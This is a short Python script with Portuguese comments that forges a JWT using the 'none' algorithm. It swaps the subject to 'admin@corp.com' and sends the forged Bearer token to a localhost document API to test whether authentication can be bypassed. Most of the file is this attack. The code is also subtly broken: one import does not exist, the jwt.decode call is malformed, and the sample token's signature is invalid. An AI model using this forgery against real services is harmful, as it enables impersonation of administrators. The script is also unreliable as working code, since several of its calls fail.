import jwt
import requests
from http import server as http_server, BaseHTTPServer  # Importando a biblioteca para servidores HTTP

# Definindo o token JWT (usando PyJWT sem verificação da assinatura)
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwWWRBZbINgoFzwd+fzfX-HMFsfzB" 

# Decodificando o token (sem assinatura)
decoded_token = jwt.decode(token, None, verify_signature=False)

print("Payload alterado:", decoded_token)  

# Recodtificando o payload utilizando 'none'
payload = {
    "sub": "admin@corp.com" 
} 

encoded_token = jwt.encode(payload, "none", algorithm='none')
print("Payload alterado:", encoded_token)  

# Requisição GET para testar a resiliência do parser de tokens HTTP
url = 'http://localhost:8080/api/documents/1' 

token_header = {'Authorization': f"Bearer {encoded_token}"} 
response = requests.get(url, headers=token_header) 

# Verificando a resposta do servidor
if response.status_code == 200:  
    print("Resposta do servidor (status code 200):", response.text) 
else: 
    print("Resposta do servidor não correspondente (status code:", response.status_code, ")"
    )